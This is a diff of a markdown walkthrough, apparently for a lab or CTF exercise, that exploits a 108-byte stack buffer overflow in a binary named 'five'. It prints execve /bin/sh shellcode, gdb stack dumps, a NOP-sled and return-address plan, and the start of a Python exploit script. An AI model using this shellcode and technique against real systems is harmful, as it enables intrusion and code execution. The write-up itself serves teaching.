@@ -431,13 +431,18 @@ void foo(void)
  return;
 }
 ```
-</br>**foo** is vulnerable to buffer overflow.  
-In order to overflow buffer we need to write more than 108 characters.  
+</br> This program seems to get input and do nothing.  
+We can see that _foo_ is vulnerable to buffer overflow, and in order to overflow buffer we need to write more than 108 characters.  
+</br>So, how can we control the execution? the principle is simple.  
+Thanks to the buffer overflow we can overwrite the return address as we wish, and as we saw: ```    Stack:    Executable```  
+The stack is executable, so why not placing instructions in the buffer and returning to it?  
+</br>  
 
-We'll use the shellcode:  
-```
-\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
-```
+_"In hacking, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability.
+It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine,  
+but any piece of code that performs a similar task can be called shellcode."_
+
+</br>We'll use the shellcode:  ```\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80```
 A simple 27bytes shellcode that's executing dash shell.  
 </br>
 First- we'll find the address that our input will be stored in.  
@@ -472,8 +477,8 @@ $gdb five
 0xbfffede0:	0x41414141	0x41414141	0x41414141	0x41414141
 0xbfffedf0:	0x41414141	0x41414141	0xbfffee00	0x0804863e
 ```
-</br>we’ll use the address **0xbfffed90** --> **0x90edffbf** (endianness)
-**foo’s** stack is looking like this:
+</br>we’ll use the address **0xbfffed90** --> **0x90edffbf** (endianness)  
+</br>_foo’s_ stack is looking like this:
 ```
 top of the stack                                             bottom of stack
 <------ [            buf[108]            ] [ ebp[4]  ] [  ret[4]  ]
@@ -482,7 +487,8 @@ bottom of memory                                             top of memory
 </br>So, in order to execute our shellcode we will:
  1. fill the buffer with nop operations (this process is called nop-slide).
  2. write our shell code
- 3. overwrite the return address to the stack address (where our payload is located).  </br>
+ 3. pad the rest of the buffer + ebp
+ 4. overwrite the return address to the stack address (where our payload is located).  </br>
 ```python
 #!/usr/bin/python
 nopsled = '\x90'*60
